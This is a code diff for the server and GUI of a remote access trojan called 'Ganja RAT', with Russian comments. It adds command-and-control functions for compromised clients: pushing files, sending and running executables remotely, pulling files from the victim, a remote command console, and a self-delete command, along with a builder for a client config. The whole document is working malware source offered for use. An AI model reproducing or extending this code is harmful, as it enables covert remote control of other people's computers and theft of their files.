@@ -2,8 +2,10 @@ import customtkinter as ctk
 import socket
 import pygame
 import os
+import queue
 import threading
 from tkinter import messagebox
+from tkinter import filedialog
 
 HOST, PORT = '127.0.0.1', 5552
 
@@ -11,13 +13,14 @@ pygame.init()
 pygame.mixer.init()
 
 class Server:
-    def __init__(self, host, port, gui, comm):
+    def __init__(self, host, port, gui):
         self.host = host 
         self.port = port  
         self.gui = gui  
-        self.comm = comm  
         self.clients = []  
         self.running = False  
+
+        self.msg_queue = queue.Queue()
 
     def start_server(self):
         self.running = True
@@ -50,76 +53,111 @@ class Server:
         self.running = False
         print("[+] Сервер остановлен.")
 
+    def send_msg(self, msg):
+        messagebox.showinfo('Ganja rat', msg)
+
     def handle_client(self, conn, addr):
         ip, port = addr
         try:
             with conn:
                 while self.running:
                     command = conn.recv(1024).decode('utf-8').strip()
+                    print(f"[+] Сообщения от {addr}: {command}")
                     if not command:
                         break  
+                    
+                    self.msg_queue.put((addr, command))
 
-                    print(f"[+] Команда от {addr}: {command}")
+                    """
+                    if 'download' in command:
+                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()"
+                    """
 
-                    self.process_command(command, conn, addr)
         except (ConnectionError, socket.error) as e:
             print(f"[-] Клиент {addr} отключился: {e}")
         finally:
             print(f"[-] Подключение с {addr} закрыто")
             self.remove_client(addr)
 
-    def process_command(self, command, conn, addr):
-        if command.startswith("download"):
-            self.download_file(conn)
-        elif command.startswith("upload"):
-            filename = command.split(" ")[1]
-            self.send_file(filename, conn)
-        elif command == "exit":
-            conn.send(b"exit")
-        else:
-            conn.send(b"UNKNOWN COMMAND")
+    def send_to_client(self, ip, port, message):
+        for client in self.clients:
+            if client["ip"] == ip and client["port"] == port:
+                try:
+                    client["conn"].send(message.encode('utf-8'))
+                    print(f"[+] Сообщение отправлено {ip}:{port}")
 
-    def send_file(self, filename, conn):
-        try:
-            if os.path.exists(filename):
-                file_size = os.path.getsize(filename)
-                header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
-                conn.send(header.ljust(1024))
+                    if 'send' in message:
+                        filepath = message[4:].strip()
+                        print(f'Отправка: {filepath}')
+                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
 
-                with open(filename, 'rb') as file:
-                    while True:
-                        data = file.read(24576)
-                        if not data:
-                            break
-                        conn.send(data)
-                print(f"[+] Файл {filename} отправлен.")
-            else:
-                conn.send(b"FILE_NOT_FOUND")
-                print(f"[-] Файл {filename} не найден.")
-        except Exception as e:
-            print(f"[-] Ошибка при отправке файла: {e}")
+                    elif 'send_run' in message:
+                        filepath = message[8:].strip()
+                        print(f'Отправка и запуск: {filepath}')
+                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
 
-    def download_file(self, conn):
-        try:
-            header = conn.recv(1024).decode('utf-8').strip()
-            if header.startswith("FILE"):
-                parts = header.split()
-                file_size = int(parts[1])
-                filename = parts[2]
+                    elif 'download' in message:
+                        file = message[8:].strip()
+                        print(f'Скачивание: {file}')
+                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
 
-                with open(filename, 'wb') as file:
-                    received = 0
-                    while received < file_size:
-                        data = conn.recv(24576)
-                        if not data:
-                            break
-                        file.write(data)
-                        received += len(data)
-                print(f"[+] Файл {filename} успешно загружен.")
-            else:
-                print("[-] Ошибка при загрузке файла: неверный заголовок.")
-        except Exception as e:
-            print(f"[-] Ошибка при загрузке файла: {e}")
+                except Exception as e:
+                    print(f"[-] Ошибка отправки {ip}:{port}: {e}")
+                return
+        print(f"[-] Клиент {ip}:{port} не найден.")
+
+    def send_file(self, filename, ip, port):
+        for client in self.clients:
+            if client["ip"] == ip and client["port"] == port:
+                try:
+                    if os.path.exists(filename):
+                        file_size = os.path.getsize(filename)
+                        header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
+                        client["conn"].send(header.ljust(1024)) 
+
+                        with open(filename, 'rb') as file:
+                            while True:
+                                data = file.read(24576)  
+                                if not data:
+                                    break
+                                client["conn"].send(data)  
+                        print(f"[+] Файл {filename} отправлен клиенту {ip}:{port}.")
+                    else:
+                        client["conn"].send(b"FILE_NOT_FOUND")
+                        print(f"[-] Файл {filename} не найден.")
+                except Exception as e:
+                    print(f"[-] Ошибка при отправке файла клиенту {ip}:{port}: {e}")
+                return
+        print(f"[-] Клиент {ip}:{port} не найден.")
+
+    def download_file(self, save_path, ip, port):
+        for client in self.clients:
+            if client["ip"] == ip and client["port"] == port:
+                try:
+                    client["conn"].send(b"SEND_FILE")
+
+                    header = client["conn"].recv(1024).decode('utf-8').strip()
+                    if header.startswith("FILE"):
+                        parts = header.split()
+                        file_size = int(parts[1])
+                        filename = parts[2]
+
+                        save_filename = os.path.join(save_path, filename)
+                        with open(save_filename, 'wb') as file:
+                            received = 0
+                            while received < file_size:
+                                data = client["conn"].recv(24576)
+                                if not data:
+                                    break
+                                file.write(data)
+                                received += len(data)
+                        print(f"[+] Файл {filename} успешно загружен от клиента {ip}:{port}.")
+                    else:
+                        print("[-] Ошибка при загрузке файла: неверный заголовок.")
+                except Exception as e:
+                    print(f"[-] Ошибка при загрузке файла от клиента {ip}:{port}: {e}")
+                return
+        print(f"[-] Клиент {ip}:{port} не найден.")
 
     def remove_client(self, addr):
         ip, port = addr
@@ -144,8 +182,7 @@ class GanjaRATApp(ctk.CTk):
         self.users = []
         self.user_frames = []
 
-        self.comm = CommandFunction()
-        self.server = Server(HOST, PORT, self, self.comm)
+        self.server = Server(HOST, PORT, self)
 
         server_thread = threading.Thread(target=self.server.start_server, daemon=True)
         server_thread.start()
@@ -202,7 +239,7 @@ class GanjaRATApp(ctk.CTk):
         self.config_app.grab_set() 
 
     def draw_func_app(self, ip, port):
-        func_app = FunctionApp(ip, port)
+        func_app = FunctionApp(ip, port, self.server)
         threading.Thread(target=func_app.mainloop())
 
 
@@ -245,27 +282,28 @@ class ConfigApp(ctk.CTkToplevel):
         ip = self.entry_ip.get()
         port = self.entry_port.get()
         build = self.build_info_file(ip, port)
+        self.destroy()
         if build:
             messagebox.showinfo('Ganja RAT', 'Config file has been build, drop this to main file')
         else:
             messagebox.showerror('Ganja RAT', 'Build config file has been not complete! Error')
-        
-        self.destroy()
 
 
 class FunctionApp(ctk.CTk):
-    def __init__(self, ip, port):
+    def __init__(self, ip, port, server):
         super().__init__()
 
         self.ip = ip
         self.port = port
+        self.server = server
 
         self.title("Function")
         self.geometry("600x500")
         
-        self.comm = CommandFunction()
-
+        self.comm = CommandFunction(self.server)
         self.create_func_app()
+
+        #self.comm.download_file(ip, port, 'playit.txt') - скачивание файла
     
     def create_func_app(self):
         self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='green')
@@ -286,9 +324,21 @@ class FunctionApp(ctk.CTk):
 
     def add_content_to_tabs(self):
         self.func_tab = self.tabview.tab("Function")
-        self.ping_btn = ctk.CTkButton(self.func_tab, text='PING', command=self.comm.ping, font=('Bold', 15))
-        self.ping_btn.pack(side='left', pady=10, padx=10)
+    
+        self.ping_btn = ctk.CTkButton(self.func_tab, text='DELETE YOURSELF FROM PC', height=50, width=500, fg_color='red',
+                                       command=lambda: self.comm.kill_yourself(self.ip, self.port, "exit"), font=('Bold', 20))
+        self.send_file_btn = ctk.CTkButton(self.func_tab, text='Sendfile', height=50, width=200,
+                                       command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15))
+        self.send_and_run_btn = ctk.CTkButton(self.func_tab, text='Send and run', height=50, width=200,
+                                       command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15))
+        self.console_btn = ctk.CTkButton(self.func_tab, text='Console', height=50, width=200,
+                                       command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15))
         
+        self.ping_btn.pack(side='bottom', pady=20, padx=20)
+        self.send_file_btn.pack(side='top', pady=10, padx=50)
+        self.send_and_run_btn.pack(side='top', pady=10, padx=50)
+        self.console_btn.pack(side='top', pady=10, padx=50)
+
         self.fun_tab = self.tabview.tab("Fun")
         
 
@@ -304,28 +354,85 @@ class FunctionApp(ctk.CTk):
     def show_tab(self, tab_name):
         self.tabview.set(tab_name)
 
-    def page_func(self):
-        pass
 
-    def page_fun(self):
-        pass
+class CommandFunction:
+    def __init__(self, server):
+        self.server = server
 
-    def page_sys(self):
-        pass
+    def console(self, ip, port):
+        self.console_app = ConsoleApp(ip, port, self.server)
 
-    def page_file(self):
-        pass
-
-    def page_info(self):
-        pass
-
-
-class CommandFunction():
     def send_msg(self, msg):
         messagebox.showinfo('Ganja rat', msg)
 
-    def ping(self):
-        pass
+    def send_and_run(self, ip, port):
+        file_path = filedialog.askopenfilename(title="Select file")
+        if file_path:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send_run {file_path}'), daemon=True).start()
+    
+    def send_file(self, ip, port):
+        file_path = filedialog.askopenfilename(title="Select file")
+        if file_path:
+            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send {file_path}'), daemon=True).start()
+
+    def download_file(self, ip, port, filename):
+        threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()
+
+    def kill_yourself(self, ip, port, msg):
+        threading.Thread(target=self.server.send_to_client, args=(ip, port, msg), daemon=True).start()
+
+
+class ConsoleApp(ctk.CTkToplevel): 
+    def __init__(self, ip, port, server):
+        super().__init__()
+
+        self.ip = ip
+        self.port = port
+        self.server = server
+
+        self.title("Ganja console")
+        self.geometry("600x500")
+        self.resizable(False, False)
+
+        self.create_console_app()
+        threading.Thread(target=self.listen_for_messages, daemon=True).start()
+
+    def create_console_app(self):
+        self.console_frame = ctk.CTkFrame(self, fg_color="gray20")
+        self.console_frame.pack(fill="both", expand=True, padx=10, pady=10)
+
+        self.console_output = ctk.CTkTextbox(self.console_frame, wrap="word", state="disabled")
+        self.console_output.pack(fill="both", expand=True, padx=10, pady=10)
+
+        self.console_input = ctk.CTkEntry(self.console_frame, placeholder_text="Enter a command...")
+        self.console_input.pack(fill="x", padx=10, pady=10)
+
+        self.send_button = ctk.CTkButton(self.console_frame, text="Send", command=self.send_command)
+        self.send_button.pack(pady=10)
+
+    def send_command(self):
+        command = self.console_input.get().strip()
+        if command:
+            threading.Thread(
+                target=self.server.send_to_client,
+                args=(self.ip, self.port, f'console {command}'),
+                daemon=True
+            ).start()
+            self.console_input.delete(0, "end")
+            self.append_output(f"> {command}")
+
+    def listen_for_messages(self):
+        while True:
+            addr, message = self.server.msg_queue.get()
+            if addr[0] == self.ip:
+                self.append_output(message)
+
+    def append_output(self, text):
+        self.console_output.configure(state="normal")
+        self.console_output.insert("end", text + "\n")
+        self.console_output.configure(state="disabled")
+        self.console_output.see("end") 
+
 
 if __name__ == "__main__":
     app = GanjaRATApp()
